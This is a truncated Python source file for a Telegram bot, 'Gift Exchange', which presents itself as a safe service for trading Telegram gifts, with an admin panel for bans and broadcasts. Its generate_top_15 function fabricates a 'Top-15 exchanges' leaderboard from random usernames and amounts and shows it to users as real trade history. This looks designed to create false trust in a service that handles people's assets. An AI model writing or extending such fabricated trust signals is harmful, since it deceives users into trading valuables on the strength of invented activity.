import os
import requests
import time
import uuid
import random
from datetime import datetime

# ===== ВСЕ СЕКРЕТЫ ИЗ ПЕРЕМЕННЫХ ОКРУЖЕНИЯ =====
TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', 0))
SUPPORT = os.getenv('SUPPORT_USERNAME')
MANAGER = os.getenv('MANAGER_USERNAME')
BOT_USERNAME = os.getenv('BOT_USERNAME')

# Проверка что все секреты загружены
if not TOKEN or not ADMIN_ID or not SUPPORT or not MANAGER or not BOT_USERNAME:
    raise ValueError("❌ ОШИБКА: Не все переменные окружения заданы! Добавь их на bothost.ru")

# ===== ХРАНИЛИЩЕ ДАННЫХ =====
deals = {}
top_deals = []
users = {}
banned_users = set()
user_states = {}
user_temp = {}

settings = {
    "min_amount": 100,
    "max_amount": 300,
    "banner_text": "👋 Приветствуем в проекте «Gift Exchange».\n\n🤝 Наш проект создан для безопасных обменов Telegram подарков между пользователями.\n\n👇 Для взаимодействия с ботом, нажмите одну из кнопок ниже:"
}

# ===== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =====
def tg_request(method, data):
    """Универсальный запрос к Telegram API"""
    url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    try:
        response = requests.post(url, json=data, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Ошибка запроса {method}: {e}")
        return None

def answer_callback(callback_id, text=None):
    """Обязательно отвечаем на callback чтобы убрать загрузку с кнопки"""
    data = {"callback_query_id": callback_id}
    if text:
        data["text"] = text
    tg_request("answerCallbackQuery", data)

# ===== КЛАВИАТУРЫ =====
def main_keyboard():
    return {
        "keyboard": [
            [{"text": "📝 Создать сделку"}],
            [{"text": "❓ Как происходит сделка"}, {"text": "ℹ️ Информация"}],
            [{"text": "📞 Техподдержка"}, {"text": "🏆 Топ-15 обменов"}]
        ],
        "resize_keyboard": True
    }

def admin_inline_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📊 Статистика", "callback_data": "admin_stats"}],
            [{"text": "📢 Рассылка", "callback_data": "admin_broadcast"}],
            [{"text": "🚫 Бан", "callback_data": "admin_ban"}],
            [{"text": "✅ Разбан", "callback_data": "admin_unban"}],
            [{"text": "📝 Баннер", "callback_data": "admin_banner"}],
            [{"text": "💰 Лимиты", "callback_data": "admin_limits"}],
            [{"text": "📋 Сделки", "callback_data": "admin_deals"}],
            [{"text": "🔄 Обновить топ", "callback_data": "admin_refresh_top"}],
            [{"text": "❌ Закрыть", "callback_data": "admin_close"}]
        ]
    }

# ===== ОТПРАВКА СООБЩЕНИЙ =====
def send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
    data = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if reply_markup:
        data["reply_markup"] = reply_markup
    return tg_request("sendMessage", data)

def send_inline(chat_id, text, buttons, parse_mode="HTML"):
    """Отправка сообщения с inline кнопками"""
    data = {
        "chat_id": chat_id,
        "text": text,
        "reply_markup": {"inline_keyboard": buttons},
        "parse_mode": parse_mode
    }
    return tg_request("sendMessage", data)

def edit_message(chat_id, message_id, text, inline_keyboard=None, parse_mode="HTML"):
    """Редактирование существующего сообщения"""
    data = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    if inline_keyboard:
        data["reply_markup"] = inline_keyboard
    return tg_request("editMessageText", data)

def delete_message(chat_id, message_id):
    tg_request("deleteMessage", {"chat_id": chat_id, "message_id": message_id})

# ===== ГЕНЕРАЦИЯ ТОП-15 =====
def generate_top_15():
    names = ["Alice", "Bob", "Charlie", "David", "Eve", "Frank", "Grace", "Henry", "Ivy", "Jack",
             "Kate", "Leo", "Mia", "Nick", "Olivia", "Paul", "Quinn", "Rita", "Sam", "Tina"]
    random_top = []
    for _ in range(15):
        amount = random.randint(100, 400)
        user1 = random.choice(names) + str(random.randint(10, 99))
        user2 = random.choice(names) + str(random.randint(10, 99))
        random_top.append({
            'user1': f"@{user1}",
            'user2': f"@{user2}",
            'amount': amount,
            'date': datetime.now().strftime("%Y-%m-%d")
        })
    random_top.sort(key=lambda x: x['amount'], reverse=True)
    return random_top

# ===== ОБРАБОТКА СООБЩЕНИЙ =====
def handle_message(message):
    chat_id = message['chat']['id']
    text = message.get('text', '')
    user_id = message['from']['id']
    username = message['from'].get('username', 'NoUsername')
    first_name = message['from'].get('first_name', 'Пользователь')

    if user_id in banned_users:
        send_message(chat_id, "🚫 Вы забанены в боте!")
        return

    if user_id not in users:
        users[user_id] = {'username': username, 'first_name': first_name, 'chat_id': chat_id}
    else:
        users[user
